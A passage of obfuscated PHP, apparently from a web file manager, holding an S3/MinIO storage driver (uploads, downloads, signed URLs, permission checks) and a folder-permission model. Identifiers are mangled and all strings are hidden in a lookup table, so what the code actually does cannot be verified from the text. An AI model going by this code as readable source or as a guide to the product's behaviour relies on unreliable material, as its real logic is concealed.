(count($„‘Œ§†Ç)) { $„‘Œ§†Ç = array_column($„‘Œ§†Ç, $ûíÉµ‰[32]); $£ÓÁ·€ì = array_merge($£ÓÁ·€ì, $„‘Œ§†Ç); } if (count($ĞÍ·ù)) { $ĞÍ·ù = array_column($ĞÍ·ù, $ûíÉµ‰[32]); $¸”ºö = array_merge($¸”ºö, $ĞÍ·ù); } if ($Š÷Êé× === null) { break; } continue; } if ($§…Ê”¹Ÿ) { if (!empty($„‘Œ§†Ç)) { if (count($„‘Œ§†Ç) > 1 || isset($„‘Œ§†Ç[0][$ûíÉµ‰[32]]) && $„‘Œ§†Ç[0][$ûíÉµ‰[32]] != $àç‡¾Ù÷) { return !0; } } } else { if (!empty($ĞÍ·ù)) { return !0; } } if ($Š÷Êé× === null) { break; } } if ($¹Äû©ÓÆ) { $£ÓÁ·€ì = array_diff($£ÓÁ·€ì, array($àç‡¾Ù÷)); $£ÓÁ·€ì = count(array_unique($£ÓÁ·€ì)); $¸”ºö = count(array_unique($¸”ºö)); return array($ûíÉµ‰[207] => $£ÓÁ·€ì, $ûíÉµ‰[208] => $¸”ºö); } return !1; } public function listAll($İƒ¤ß) { $Ç¸š¦ÙÛ =& $_SERVER[óó‹¸‚å]; $İğİÅêú = $this->fileList($İƒ¤ß, $Ç¸š¦ÙÛ[12], !0); $ÁÜáç—ğ = array(); foreach ($İğİÅêú[$Ç¸š¦ÙÛ[83]] as $ß×áäÏù) { $ÁÜáç—ğ[$ß×áäÏù[$Ç¸š¦ÙÛ[32]]] = $ß×áäÏù[$Ç¸š¦ÙÛ[76]]; } foreach ($İğİÅêú[$Ç¸š¦ÙÛ[82]] as $ß×áäÏù) { if (is_string($ß×áäÏù)) { $ÁÜáç—ğ[$ß×áäÏù] = 0; } } return $this->listAllFiles($İƒ¤ß, array_keys($ÁÜáç—ğ), $ÁÜáç—ğ); } public function canRead($ƒÆô˜é§) { $…‹ÛÂëÖ =& $_SERVER[óó‹¸‚å]; $ê´‘²Û = $this->client->getAccessControlPolicy($this->bucket, $ƒÆô˜é§); if (!$ê´‘²Û) { return !1; } return in_array($ê´‘²Û, array($…‹ÛÂëÖ[209], $…‹ÛÂëÖ[210], $…‹ÛÂëÖ[211])) ? !0 : !1; } public function canWrite($”şŸØ×Í) { $ûÓ§Œì÷ =& $_SERVER[óó‹¸‚å]; $–ŸÃÇ = $this->client->getAccessControlPolicy($this->bucket, $”şŸØ×Í); if (!$–ŸÃÇ) { return !1; } return in_array($–ŸÃÇ, array($ûÓ§Œì÷[209], $ûÓ§Œì÷[210])) ? !0 : !1; } public function getContent($¬ÕñËÏ¦) { return $this->client->getObject($this->bucket, $¬ÕñËÏ¦); } public function setContent($¢ëñÎ¡È, $£¢®šæ¡ = '', $åØ•ĞÁÅ = false) { $‚áÃêõç =& $_SERVER[óó‹¸‚å]; $¢ëñÎ¡È = $åØ•ĞÁÅ ? trim($¢ëñÎ¡È, $‚áÃêõç[8]) . $‚áÃêõç[8] : $¢ëñÎ¡È; $¶…Ÿ‡ìË = get_file_mime(get_path_ext($¢ëñÎ¡È)); $—ÈœŠ¥ = $this->client->putObject($£¢®šæ¡, $this->bucket, $¢ëñÎ¡È, $‚áÃêõç[198], array(), $¶…Ÿ‡ìË); if (!$—ÈœŠ¥) { return !1; } if ($åØ•ĞÁÅ) { return !0; } $this->cacheMethod(null, null); $—ÈœŠ¥ = $this->copyFile($¢ëñÎ¡È, $¢ëñÎ¡È, array($‚áÃêõç[212] => $—ÈœŠ¥[$‚áÃêõç[213]])); return $—ÈœŠ¥ ? !0 : !1; } public function fileSubstr($¼úß“±©, $Ä—·Á×Ş, $Ù‡¬¼„Á) { $‹£ÑÇœ = $Ä—·Á×Ş + $Ù‡¬¼„Á - 1; return $this->client->getObject($this->bucket, $¼úß“±©, array($_SERVER[óó‹¸‚å][214] => "\x62\171\164\145\x73\x3d{$Ä—·Á×Ş}\x2d{$‹£ÑÇœ}")); } public function upload($ûŸøëú, $¥¶©Ï˜÷, $×‡Í½îœ = false, $İö¤Ú¼€ = REPEAT_REPLACE) { $„¾†Û±œ =& $_SERVER[óó‹¸‚å]; $õ–³¡ì” = array($„¾†Û±œ[212] => @md5_file($¥¶©Ï˜÷)); $¼îË­ = array($„¾†Û±œ[215] => get_file_mime(get_path_ext($ûŸøëú))); if (IO::size($¥¶©Ï˜÷) <= 1024 * 1024 * 200) { $®µú¿Æ¶ = $this->client->putObjectFile($¥¶©Ï˜÷, $this->bucket, $ûŸøëú, $„¾†Û±œ[198], $õ–³¡ì”, $¼îË­); return !empty($®µú¿Æ¶) ? $this->getPathOuter($ûŸøëú) : !1; } $ò¸‹Î­„ = $this->client->multiUploadObject($¥¶©Ï˜÷, $this->bucket, trim($ûŸøëú, $„¾†Û±œ[8]), $õ–³¡ì”, $¼îË­); return $ò¸‹Î­„ ? $this->getPathOuter($ûŸøëú) : !1; } public function download($à€­¼¼, $üÕ¶ıó) { if (!@is_dir($this->pathFather($üÕ¶ıó)) && !IO::mkdir($this->pathFather($üÕ¶ıó))) { return !1; } $êæ½ˆª‰ = $this->client->getObject($this->bucket, $à€­¼¼, array(), $üÕ¶ıó); return $êæ½ˆª‰ !== !1 ? $üÕ¶ıó : !1; } public function link($åş‘Ğ½, $€Ä”ç³Ã = array()) { $€´ëÔ½… =& $_SERVER[óó‹¸‚å]; if ($this->signVer == $€´ëÔ½…[216]) { return $this->client->getAuthenticatedURL($this->bucket, $åş‘Ğ½, 3600 * 12, $€Ä”ç³Ã); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($åş‘Ğ½, $€´ëÔ½…[8]), 3600 * 12, $this->region, array(), !0, $€Ä”ç³Ã); } public function fileOut($í Ä¯ÜÊ, $Ïû‡¬¾  = false, $™Å¬Çêã = false, $¬ÀÖ±æé = '') { $‰È×Æœ =& $_SERVER[óó‹¸‚å]; if ($this->isFileOutServer()) { return $this->fileOutServer($í Ä¯ÜÊ, $Ïû‡¬¾ , $™Å¬Çêã, $¬ÀÖ±æé); } if (!$™Å¬Çêã) { $™Å¬Çêã = $this->pathThis($í Ä¯ÜÊ); } $ü¬»üÁô = get_file_mime(get_path_ext($™Å¬Çêã)); if ($ü¬»üÁô == $‰È×Æœ[217]) { return parent::fileOut($í Ä¯ÜÊ, $Ïû‡¬¾ , $™Å¬Çêã, $¬ÀÖ±æé); } $ªã¢‡ÌØ = array($‰È×Æœ[218] => $ü¬»üÁô); if ($Ïû‡¬¾ ) { $ªã¢‡ÌØ[$‰È×Æœ[219]] = $‰È×Æœ[220] . rawurlencode($™Å¬Çêã); } else { } $Ÿ–ì½È = $this->link($í Ä¯ÜÊ, $ªã¢‡ÌØ); $this->fileOutLink($Ÿ–ì½È); } public function fileOutServer($ä§Ê¨’û, $ø‘ÙçÂ = false, $ËğÄ¹€Ñ = false, $‚á€ß…Ç = '') { parent::fileOut($ä§Ê¨’û, $ø‘ÙçÂ, $ËğÄ¹€Ñ, $‚á€ß…Ç); } public function fileOutImageServer($ÆÀÕë©‘, $Æªå¯ş = 250) { parent::fileOutImage($ÆÀÕë©‘, $Æªå¯ş); } public function hashMd5($à¿Éê‹¯, $…Ç¸¯ÍŠ = '') { $ùâêŒ =& $_SERVER[óó‹¸‚å]; $„§—÷±ó = $this->objectMeta($à¿Éê‹¯); if (!$„§—÷±ó) { return !1; } $…Ç¸¯ÍŠ = $…Ç¸¯ÍŠ ? $…Ç¸¯ÍŠ : _get($„§—÷±ó, $ùâêŒ[221]); $…Ç¸¯ÍŠ = $…Ç¸¯ÍŠ ? $…Ç¸¯ÍŠ : _get($„§—÷±ó, $ùâêŒ[213], $ùâêŒ[12]); return $…Ç¸¯ÍŠ; } public function uploadFormData($ÉĞ‡Éì«, $÷ÎüºŠË = 3600) { $Ø÷¬°§— =& $_SERVER[óó‹¸‚å]; $°ıÒ×î³ = $this->pathFather($ÉĞ‡Éì«); $å—ÕÖÒ³ = $this->client->getHttpUploadPostParams($this->bucket, $°ıÒ×î³, $Ø÷¬°§—[198], $÷ÎüºŠË); return array_merge((array) $å—ÕÖÒ³, array($Ø÷¬°§—[181] => $this->getHost())); } public function multiUploadFormData($¨èÒ÷à, $©”Í…ªÃ = 3600) { $²ïòÈæß =& $_SERVER[óó‹¸‚å]; $ØÉÎ½ô‡ = gmdate($²ïòÈæß[222]); $é·äœ‰ = array(); $ôÂõƒˆæ = $this->client->getUploadId($this->bucket, $¨èÒ÷à, $é·äœ‰); if (!$ôÂõƒˆæ) { return !1; } return array($²ïòÈæß[223] => $ôÂõƒˆæ, $²ïòÈæß[181] => $this->getHost() . $²ïòÈæß[8] . $this->pathEncode($¨èÒ÷à), $²ïòÈæß[224] => $ØÉÎ½ô‡, $²ïòÈæß[94] => $¨èÒ÷à); } public function multiUploadAuthData($ìòûÄÍĞ, $ì‹Æ·„ì = array()) { $¨Õ¦“ =& $_SERVER[óó‹¸‚å]; $ùíóˆ‹ş = isset($ì‹Æ·„ì[$¨Õ¦“[224]]) ? $ì‹Æ·„ì[$¨Õ¦“[224]] : gmdate($¨Õ¦“[222]); $áŠÜ‰·ş = isset($ì‹Æ·„ì[$¨Õ¦“[174]]) ? $ì‹Æ·„ì[$¨Õ¦“[174]] : $¨Õ¦“[12]; $­ïÔò€¡ = $ì‹Æ·„ì[$¨Õ¦“[94]]; unset($ì‹Æ·„ì[$¨Õ¦“[94]]); if (isset($ì‹Æ·„ì[$¨Õ¦“[225]])) { $ì‹Æ·„ì[$¨Õ¦“[224]] = $ùíóˆ‹ş; return $this->listUploadParts($­ïÔò€¡, $ì‹Æ·„ì); } $Ôû”¿Æ× = array($¨Õ¦“[226], $¨Õ¦“[12], $¨Õ¦“[120], $¨Õ¦“[12], "\170\x2d\141\155\x7a\x2d\x64\x61\164\145\x3a{$ùíóˆ‹ş}", $¨Õ¦“[8] . $this->bucket . $¨Õ¦“[8] . $this->pathEncode($­ïÔò€¡) . $áŠÜ‰·ş); if (strpos($áŠÜ‰·ş, $¨Õ¦“[227]) === 0) { $Ôû”¿Æ×[0] = $¨Õ¦“[228]; } if (isset($ì‹Æ·„ì[$¨Õ¦“[229]]) && $ì‹Æ·„ì[$¨Õ¦“[229]] == $¨Õ¦“[230]) { $Ôû”¿Æ×[0] = $¨Õ¦“[230]; } $’“¸»Éí = implode($¨Õ¦“[231], $Ôû”¿Æ×); $Æäì¿áÎ = base64_encode(hash_hmac($¨Õ¦“[232], $’“¸»Éí, $this->secret, !0)); $Â÷Öû° = $¨Õ¦“[233] . $this->accessKey . $¨Õ¦“[4] . $Æäì¿áÎ; if (strpos($áŠÜ‰·ş, $¨Õ¦“[227]) === 0) { return array($¨Õ¦“[234] => $Â÷Öû°, $¨Õ¦“[224] => $ùíóˆ‹ş); } return $Â÷Öû°; } public function listUploadParts($ëÜÓ …€, $âÆï“¾û = array()) { $‘ƒ€Äş† =& $_SERVER[óó‹¸‚å]; $Ğ…ÓØ = str_replace($‘ƒ€Äş†[235], $‘ƒ€Äş†[12], $âÆï“¾û[$‘ƒ€Äş†[174]]); $ü•¸¢Àù = $this->client->listParts($this->bucket, $ëÜÓ …€, $Ğ…ÓØ); if (!$ü•¸¢Àù) { return !1; } unset($âÆï“¾û[$‘ƒ€Äş†[225]], $âÆï“¾û[$‘ƒ€Äş†[229]]); $âÆï“¾û[$‘ƒ€Äş†[94]] = $ëÜÓ …€; $ğş©µ¬ = $this->multiUploadAuthData($ëÜÓ …€, $âÆï“¾û); if (empty($ğş©µ¬)) { return !1; } return array($‘ƒ€Äş†[234] => $ğş©µ¬, $‘ƒ€Äş†[224] => $âÆï“¾û[$‘ƒ€Äş†[224]], $‘ƒ€Äş†[236] => $ü•¸¢Àù); } public function getHost() { return parent::getHost() . $_SERVER[óó‹¸‚å][8] . $this->bucket; } public function size($Øœ¹”„) { $ÖÈâÄíÏ = $this->objectMeta($Øœ¹”„); return $ÖÈâÄíÏ ? $ÖÈâÄíÏ[$_SERVER[óó‹¸‚å][76]] : 0; } public function info($ÖğÏË½É) { if ($this->isFolder($ÖğÏË½É)) { return $this->folderInfo($ÖğÏË½É); } else { if ($this->isFile($ÖğÏË½É)) { return $this->fileInfo($ÖğÏË½É); } } return !1; } public function exist($Åª¡ÕŒ) { return $this->isFile($Åª¡ÕŒ) || $this->isFolder($Åª¡ÕŒ); } public function isFile($Â¬™È) { return !$this->isFolder($Â¬™È) && $this->objectMeta($Â¬™È); } public function isFolder($Ùä×¨í´) { return $this->cacheMethod($_SERVER[óó‹¸‚å][165], $Ùä×¨í´); } protected function objectMeta($ÏÊº„ç°) { return $this->cacheMethod($_SERVER[óó‹¸‚å][167], $ÏÊº„ç°); } protected function _objectMeta($ßŸ§²ŒÊ) { $Òå¨îåÄ =& $_SERVER[óó‹¸‚å]; $ßŸ§²ŒÊ = rtrim($ßŸ§²ŒÊ, $Òå¨îåÄ[8]); try { $œ´×Û™¤ = $this->client->getObjectInfo($this->bucket, $ßŸ§²ŒÊ); if (!isset($œ´×Û™¤[$Òå¨îåÄ[221]]) && isset($œ´×Û™¤[$Òå¨îåÄ[237]])) { $œ´×Û™¤[$Òå¨îåÄ[221]] = $œ´×Û™¤[$Òå¨îåÄ[237]]; } } catch (Exception $êäôªÌ‚) { $œ´×Û™¤ = !1; } if (!$œ´×Û™¤) { } return $œ´×Û™¤; } protected function _isFolder($ñŠãÕ‘¶) { $’ÄÖñğ =& $_SERVER[óó‹¸‚å]; $ñŠãÕ‘¶ = rtrim($ñŠãÕ‘¶, $’ÄÖñğ[8]); if ($ñŠãÕ‘¶ == $’ÄÖñğ[12] || $ñŠãÕ‘¶ == $’ÄÖñğ[8]) { return !0; } $—æ—¬“Ÿ = $this->client->getBucket($this->bucket, $ñŠãÕ‘¶, null, 1); if (empty($—æ—¬“Ÿ[$’ÄÖñğ[204]])) { return !1; } $ûâı·ÁĞ = $—æ—¬“Ÿ[$’ÄÖñğ[204]][0][$’ÄÖñğ[32]]; return stripos($ûâı·ÁĞ, $ñŠãÕ‘¶ . $’ÄÖñğ[8]) === 0 ? !0 : !1; if (substr($ûâı·ÁĞ, -1) == $’ÄÖñğ[8]) { return !0; } if (get_path_this($ûâı·ÁĞ) == get_path_this($ñŠãÕ‘¶)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Ï¤ğ¹ã°) { parent::__construct($Ï¤ğ¹ã°); $this->signatureVersion($_SERVER[óó‹¸‚å][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto b„Ï­Á“ ; bÛå»áÖí©: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\x75\x72\143\145\x5f\x61\165\x74\x68"; public function getAuth($¶¼†¿¤¯) { $¨™¼œ… =& $_SERVER[óó‹¸‚å]; $Ëøê´³ = $this->sourceAuthSelect($¶¼†¿¤¯); $¦ë«ÙÂí = array(); $˜“¾«¢ = array(); $¡Çı±§É = 2 << 25; foreach ($Ëøê´³ as $°ìï°û§) { $Ô¢Á Ñ = Model($¨™¼œ…[507])->listData($°ìï°û§[$¨™¼œ…[1967]]); if (!$Ô¢Á Ñ) { continue; } $¦ë«ÙÂí[] = $°ìï°û§; $ˆ—¬â…† = 0; if ($°ìï°û§[$¨™¼œ…[411]] == SourceModel::TYPE_GROUP) { $ˆ—¬â…† = $¡Çı±§É * 2; } if ($°ìï°û§[$¨™¼œ…[411]] == SourceModel::TYPE_USER) { $ˆ—¬â…† = $¡Çı±§É; } if ($°ìï°û§[$¨™¼œ…[411]] == SourceModel::TYPE_USER && $°ìï°û§[$¨™¼œ…[505]] == $¨™¼œ…[197]) { $ˆ—¬â…† = 0; } $˜“¾«¢[] = $Ô¢Á Ñ[$¨™¼œ…[413]] + $ˆ—¬â…†; } array_multisort($˜“¾«¢, SORT_DESC, $¦ë«ÙÂí); return $¦ë«ÙÂí; } public function sourceAuthSelect($ê§åŸê’) { $µÇÒŸ„æ =& $_SERVER[óó‹¸‚å]; static $Ş•ç½«œ = array(); $çÍ©÷‹š = is_array($ê§åŸê’) ? !1 : !0; if ($çÍ©÷‹š) { $ê§åŸê’ = array($ê§åŸê’); } $”Ç ãè± = array(); foreach ($ê§åŸê’ as $£Àğ¸­ú) { if (isset($Ş•ç½«œ[$£Àğ¸­ú])) { $”Ç ãè±[$£Àğ¸­ú] = $Ş•ç½«œ[$£Àğ¸­ú]; } } if (count($”Ç ãè±) == count($ê§åŸê’)) { return $çÍ©÷‹š ? $”Ç ãè±[$ê§åŸê’[0]] : $”Ç ãè±; } $ç¯îã¬¹ = $µÇÒŸ„æ[2040]; $Óàõíö = array($µÇÒŸ„æ[402] => array($µÇÒŸ„æ[7], $ê§åŸê’)); $”¿ïòÍƒ = $this->field($ç¯îã¬¹)->order($µÇÒŸ„æ[399])->where($Óàõíö)->select(); $Ø®œÃÃ¨ = array_to_keyvalue_group($”¿ïòÍƒ, $µÇÒŸ„æ[402]); foreach ($ê§åŸê’ as $£Àğ¸­ú) { $Ş•ç½«œ[$£Àğ¸­ú] = $Ø®œÃÃ¨[$£Àğ¸­ú] ? $Ø®œÃÃ¨[$£Àğ¸­ú] : array(); } if ($çÍ©÷‹š) { return $”¿ïòÍƒ; } return $Ø®œÃÃ¨; } public function setAuth($Ğ²»¾Òø, $Ìƒ„©•„) { $ó¨¨å¨í =& $_SERVER[óó‹¸‚å]; $ŞñŞªâù = Model($ó¨¨å¨í[1343])->sourceInfo($Ğ²»¾Òø); if (!$ŞñŞªâù) { return !1; } if ($ŞñŞªâù[$ó¨¨å¨í[411]] != SourceModel::TYPE_GROUP) { return !1; } $Â»ñ †û = 1; $¬³¡‡³ = $ŞñŞªâù[$ó¨¨å¨í[505]]; if ($¬³¡‡³ != $Â»ñ †û) { $ë ¨ò±› = array($ó¨¨å¨í[1863] => $¬³¡‡³); $›é›šÉ³ = Model($ó¨¨å¨í[1953])->field($ó¨¨å¨í[1674])->where($ë ¨ò±›)->select(); $›é›šÉ³ = array_to_keyvalue($›é›šÉ³, $ó¨¨å¨í[12], $ó¨¨å¨í[1674]); } $¾ÙçàÖ¥ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ãÖúæÀ = array(); foreach ($Ìƒ„©•„ as $±—¯šáÌ) { if (!in_array($±—¯šáÌ[$ó¨¨å¨í[411]], $¾ÙçàÖ¥)) { show_json(LNG($ó¨¨å¨í[2041]), !1); } if ($¬³¡‡³ != $Â»ñ †û) { if ($±—¯šáÌ[$ó¨¨å¨í[411]] == SourceModel::TYPE_GROUP) { } if ($±—¯šáÌ[$ó¨¨å¨í[505]] != 0 && !in_array($±—¯šáÌ[$ó¨¨å¨í[505]], $›é›šÉ³)) { } } if ($±—¯šáÌ[$ó¨¨å¨í[505]] == 0) { $±—¯šáÌ[$ó¨¨å¨í[411]] = SourceModel::TYPE_USER; } $ãÖúæÀ[] = array($ó¨¨å¨í[402] => $Ğ²»¾Òø, $ó¨¨å¨í[411] => intval($±—¯šáÌ[$ó¨¨å¨í[411]]), $ó¨¨å¨í[505] => intval($±—¯šáÌ[$ó¨¨å¨í[505]]), $ó¨¨å¨í[1967] => intval($±—¯šáÌ[$ó¨¨å¨í[1967]]) ? intval($±—¯šáÌ[$ó¨¨å¨í[1967]]) : 0, $ó¨¨å¨í[2023] => intval($±—¯šáÌ[$ó¨¨å¨í[2023]]) ? intval($±—¯šáÌ[$ó¨¨å¨í[2023]]) : -1); } $this->where(array($ó¨¨å¨í[417] => $Ğ²»¾Òø))->delete(); $this->addAll($ãÖúæÀ); return !0; } public function authClear($ş÷¡äû“) { $ãğŒ“œè =& $_SERVER[óó‹¸‚å]; $Á„îÂ˜¬ = Model($ãğŒ“œè[1343])->sourceInfo($ş÷¡äû“); $“Àö×  = array($ş÷¡äû“); if ($Á„îÂ˜¬[$ãğŒ“œè[410]] == $ãğŒ“œè[88]) { $ÉŠ³åÛƒ = array($ãğŒ“œè[590] => array($ãğŒ“œè[550], $Á„îÂ˜¬[$ãğŒ“œè[521]] . $ş÷¡äû“ . $ãğŒ“œè[551])); $“Àö×  = Model($ãğŒ“œè[1343])->field($ãğŒ“œè[417])->where($ÉŠ³åÛƒ)->getField($ãğŒ“œè[402], !0); $“Àö× [] = $ş÷¡äû“; } $this->where(array($ãğŒ“œè[417] => array($ãğŒ“œè[418], $“Àö× )))->delete(); return !0; } public function getAllChildren($ÑÀôÇ±) { $¿§™»ÅÔ =& $_SERVER[óó‹¸‚å]; $õš›ˆì = Model($¿§™»ÅÔ[1343])->sourceInfo($ÑÀôÇ±); if ($õš›ˆì[$¿§™»ÅÔ[410]] != $¿§™»ÅÔ[88]) { return $this->sourceListAuth(array($ÑÀôÇ±)); } if ($õš›ˆì[$¿§™»ÅÔ[411]] != SourceModel::TYPE_GROUP) { return array(); } $ãà©¸ì× = 1; $é£ÍÉ¾ = array($ÑÀôÇ±); if ($õš›ˆì[$¿§™»ÅÔ[432]] == $¿§™»ÅÔ[197] && $õš›ˆì[$¿§™»ÅÔ[505]] != $ãà©¸ì×) { $é£ÍÉ¾ = $this->groupChidldAllRootSource($õš›ˆì[$¿§™»ÅÔ[505]]); } $‰ÇÅ€‘î = $this->field($¿§™»ÅÔ[402])->group($¿§™»ÅÔ[402])->select(); $‰ÇÅ€‘î = array_to_keyvalue($‰ÇÅ€‘î, $¿§™»ÅÔ[12], $¿§™»ÅÔ[402]); if (!$‰ÇÅ€‘î) { return array(); } $¶¾²€‰Ú = $¿§™»ÅÔ[2042]; $º¢»ş‘¦ = array($¿§™»ÅÔ[402] => array($¿§™»ÅÔ[7], $‰ÇÅ€‘î), $¿§™»ÅÔ[431] => $¿§™»ÅÔ[197]); $İå¡äŒÍ = Model($¿§™»ÅÔ[829])->field($¶¾²€‰Ú)->where($º¢»ş‘¦)->select(); $¬úËÒ = array($ÑÀôÇ±); foreach ($İå¡äŒÍ as $‡ÇË†Íú) { foreach ($é£ÍÉ¾ as $÷…İ¯) { $—Ü‚üµÚ = $¿§™»ÅÔ[50] . $÷…İ¯ . $¿§™»ÅÔ[50]; $Ù‘º•»• = $‡ÇË†Íú[$¿§™»ÅÔ[521]] . $‡ÇË†Íú[$¿§™»ÅÔ[402]] . $¿§™»ÅÔ[50]; if (strstr($Ù‘º•»•, $—Ü‚üµÚ)) { $¬úËÒ[] = $‡ÇË†Íú[$¿§™»ÅÔ[402]]; break; } } } return $this->sourceListAuth($¬úËÒ); } private function sourceListAuth($óÌÊĞ€) { $ô›ªïÏä =& $_SERVER[óó‹¸‚å]; $»¬…Çşå = Model($ô›ªïÏä[1343])->sourceListInfo($óÌÊĞ€, !0); $¯¡²¿í¢ = $this->sourceAuthSelect($óÌÊĞ€); $ÅÏÍ©úË = array(); $Äµ±àŠ = array(); foreach ($»¬…Çşå as $ä¢¼“â¾) { unset($ä¢¼“â¾[$ô›ªïÏä[456]]); unset($ä¢¼“â¾[$ô›ªïÏä[454]]); unset($ä¢¼“â¾[$ô›ªïÏä[413]]); unset($ä¢¼“â¾[$ô›ªïÏä[86]]); $ˆ—ß§²À = $¯¡²¿í¢[$ä¢¼“â¾[$ô›ªïÏä[402]]]; if (!$ˆ—ß§²À) { continue; } $ä¢¼“â¾[$ô›ªïÏä[2043]] = $this->authTargetInfo($ˆ—ß§²À); $ä¢¼“â¾[$ô›ªïÏä[519]] = rtrim($ä¢¼“â¾[$ô›ªïÏä[525]], $ô›ªïÏä[8]) . $ô›ªïÏä[8] . ltrim($ä¢¼“â¾[$ô›ªïÏä[519]], $ô›ªïÏä[8]); $ÅÏÍ©úË[] = $ä¢¼“â¾; $å„ÜôÊÕ = count(explode($ô›ªïÏä[8], trim($ä¢¼“â¾[$ô›ªïÏä[519]], $ô›ªïÏä[8]))); $Äµ±àŠ[] = $å„ÜôÊÕ + ($ä¢¼“â¾[$ô›ªïÏä[33]] == $ô›ªïÏä[75] ? 0 : 1000); } array_multisort($Äµ±àŠ, SORT_ASC, $ÅÏÍ©úË); return $ÅÏÍ©úË; } private function groupChidldAllRootSource($¿ÄÈÚâô) { $Şµ·şÊá =& $_SERVER[óó‹¸‚å]; $ñ¨ıÒéŸ = Model($Şµ·şÊá[2044])->groupChildrenAll($¿ÄÈÚâô); $Ï»˜´ = array($Şµ·şÊá[432] => 0, $Şµ·şÊá[505] => array($Şµ·şÊá[7], $ñ¨ıÒéŸ), $Şµ·şÊá[411] => SourceModel::TYPE_GROUP); $üô±ˆÆ„ = Model($Şµ·şÊá[829])->field($Şµ·şÊá[402])->where($Ï»˜´)->select(); $üô±ˆÆ„ = array_to_keyvalue($üô±ˆÆ„, $Şµ·şÊá[12], $Şµ·şÊá[402]); return $üô±ˆÆ„; } private function authTargetInfo($ıšş’å) { $Â÷‘çó² =& $_SERVER[óó‹¸‚å]; $Ÿàßóª = array(); $ì–è¤‚Û = array(); $¢©ì²ù³ = 2 << 25; foreach ($ıšş’å as $ñ¼Ù®¿Š) { $±”¢Øñ = Model($Â÷‘çó²[507])->listData($ñ¼Ù®¿Š[$Â÷‘çó²[1967]]); if (!$±”¢Øñ) { continue; } if ($ñ¼Ù®¿Š[$Â÷‘çó²[411]] == SourceModel::TYPE_USER) { $çñ÷Å ƒ = Model($Â÷‘çó²[513])->getInfoSimpleOuter($ñ¼Ù®¿Š[$Â÷‘çó²[505]]); if ($çñ÷Å ƒ[$Â÷‘çó²[1674]] == $Â÷‘çó²[1196]) { continue; } if ($çñ÷Å ƒ[$Â÷‘çó²[1674]] == $Â÷‘çó²[197]) { $çñ÷Å ƒ[$Â÷‘çó²[32]] = LNG($Â÷‘çó²[2045]); } } else { $çñ÷Å ƒ = Model($Â÷‘çó²[522])->getInfoSimple($ñ¼Ù®¿Š[$Â÷‘çó²[505]]); } if (!$çñ÷Å ƒ) { continue; } $çñ÷Å ƒ[$Â÷‘çó²[467]] = $±”¢Øñ; $Ÿàßóª[] = $çñ÷Å ƒ; $‹ûÀºüØ = 0; if ($ñ¼Ù®¿Š[$Â÷‘çó²[411]] == SourceModel::TYPE_GROUP) { $‹ûÀºüØ = $¢©ì²ù³ * 2; } if ($ñ¼Ù®¿Š[$Â÷‘çó²[411]] == SourceModel::TYPE_USER) { $‹ûÀºüØ = $¢©ì²ù³; } if ($ñ¼Ù®¿Š[$Â÷‘çó²[411]] == SourceModel::TYPE_USER && $ñ¼Ù®¿Š[$Â÷‘çó²[505]] == $Â÷‘çó²[197]) { $‹ûÀºüØ = 0; } $ì–è¤‚Û[] = $±”¢Øñ[$Â÷‘çó²[413]] + $‹ûÀºüØ; } array_multisort($ì–è¤‚Û, SORT_DESC, $Ÿàßóª); return $Ÿàßóª; } public function getAllChildrenByUser($§å°ó†Ï, $©Õ·ı¬÷) { $®ÉÂÓ×Û =& $_SERVER[óó‹¸‚å]; $‹ãó˜Ğâ = Model($®ÉÂÓ×Û[535])->getInfo($©Õ·ı¬÷); if (!$©Õ·ı¬÷ || !$§å°ó†Ï || !$‹ãó˜Ğâ) { return array(); } $şµ¤­­° = Model($®ÉÂÓ×Û[1343])->sourceInfo($§å°ó†Ï); $á®µí¨ä = array(); $…Èõ´ã = 1; if ($şµ¤­­°[$®ÉÂÓ×Û[432]] == $®ÉÂÓ×Û[197] && $şµ¤­­°[$®ÉÂÓ×Û[505]] != $…Èõ´ã && $this->groupContainUser($şµ¤­­°[$®ÉÂÓ×Û[505]], $©Õ·ı¬÷)) { foreach ($‹ãó˜Ğâ[$®ÉÂÓ×Û[2046]] as $Àà…ÌÁÅ) { $È”±³º = Model($®ÉÂÓ×Û[522])->getInfo($Àà…ÌÁÅ[$®ÉÂÓ×Û[1863]]); $ÈèÚÈ˜› = Model($®ÉÂÓ×Û[535])->getInfoSimpleOuter($©Õ·ı¬÷); $ÈèÚÈ˜›[$®ÉÂÓ×Û[467]] = $Àà…ÌÁÅ[$®ÉÂÓ×Û[413]]; if (Model($®ÉÂÓ×Û[507])->authCheckAction($Àà…ÌÁÅ[$®ÉÂÓ×Û[413]][$®ÉÂÓ×Û[413]], $®ÉÂÓ×Û[1884])) { continue; } $øÔòóüƒ = array($®ÉÂÓ×Û[32] => $®ÉÂÓ×Û[1216] . $È”±³º[$®ÉÂÓ×Û[32]], $®ÉÂÓ×Û[402] => $È”±³º[$®ÉÂÓ×Û[86]][$®ÉÂÓ×Û[402]], $®ÉÂÓ×Û[84] => KodIO::make($È”±³º[$®ÉÂÓ×Û[86]][$®ÉÂÓ×Û[402]]), $®ÉÂÓ×Û[432] => $®ÉÂÓ×Û[197], $®ÉÂÓ×Û[411] => $®ÉÂÓ×Û[515], $®ÉÂÓ×Û[33] => $®ÉÂÓ×Û[554], $®ÉÂÓ×Û[519] => $È”±³º[$®ÉÂÓ×Û[526]], $®ÉÂÓ×Û[1863] => $È”±³º[$®ÉÂÓ×Û[1863]], $®ÉÂÓ×Û[523] => $È”±³º[$®ÉÂÓ×Û[432]], $®ÉÂÓ×Û[2043] => array($ÈèÚÈ˜›)); $á®µí¨ä[$øÔòóüƒ[$®ÉÂÓ×Û[402]]] = $øÔòóüƒ; } } $²½¶ÁÏê = array(); $®’¶îÚ´ = $this->getAllChildren($§å°ó†Ï); foreach ($®’¶îÚ´ as $Ğ­Á°˜Ï) { $ÉşŸºÔ = !1; foreach ($Ğ­Á°˜Ï[$®ÉÂÓ×Û[2043]] as $¼–ºˆ¾´) { if ($¼–ºˆ¾´[$®ÉÂÓ×Û[1674]]) { if ($¼–ºˆ¾´[$®ÉÂÓ×Û[1674]] == $©Õ·ı¬÷) { $ÉşŸºÔ = !0; break; } } if ($¼–ºˆ¾´[$®ÉÂÓ×Û[1863]]) { if ($this->groupContainUser($¼–ºˆ¾´[$®ÉÂÓ×Û[1863]], $©Õ·ı¬÷)) 